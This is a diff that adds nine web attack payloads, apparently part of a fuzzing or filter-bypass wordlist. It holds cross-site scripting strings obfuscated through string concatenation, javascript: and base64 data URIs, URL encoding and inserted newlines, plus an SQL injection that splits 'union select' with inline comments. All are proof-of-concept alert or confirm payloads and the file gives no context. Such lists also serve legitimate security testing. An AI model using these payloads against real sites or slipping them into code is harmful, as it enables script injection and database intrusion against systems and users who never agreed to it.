@@ -1,0 +1,9 @@
+Function("ale"+"rt(1)")();
+javascript:74163166147401571561541571411447514115414516216450615176
+<iframe src="javascript:alert(`xss`)">
+/?id=1+un/**/ion+sel/**/ect+1,2,3--
+new Function`alt\`6\``;
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+%26%2397;lert(1)
+<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>
